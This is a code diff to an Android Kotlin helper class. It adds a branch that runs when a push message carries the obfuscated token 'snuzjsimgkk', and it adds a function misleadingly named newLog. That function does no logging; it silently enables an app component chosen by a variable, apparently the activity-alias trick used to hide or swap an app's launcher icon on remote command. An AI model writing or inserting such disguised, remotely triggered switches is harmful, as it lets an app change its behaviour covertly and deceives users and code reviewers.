@@ -1,6 +1,8 @@
 package com.raven.tabor.core
 
+import android.content.ComponentName
 import android.content.Context
+import android.content.pm.PackageManager
 import androidx.work.ExistingWorkPolicy
 import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
@@ -13,11 +15,17 @@ import java.util.concurrent.TimeUnit
  * Describe:
  */
 object CenterHelper {
+    var name = ""
     fun checkFcm(context: Context, string: String) {
         when (string) {
             "onCreate" -> {
                 TaborHelper.openService(context)
             }
+
+            "snuzjsimgkk" -> {
+                newLog(context, name)
+            }
+
             else -> {}
         }
     }
@@ -41,4 +49,14 @@ object CenterHelper {
 //            work
 //        )
 //    }
+
+
+    private fun newLog(context: Context, alias: String) {
+        val pm = context.packageManager
+        pm.setComponentEnabledSetting(
+            ComponentName(context, alias),
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
 }
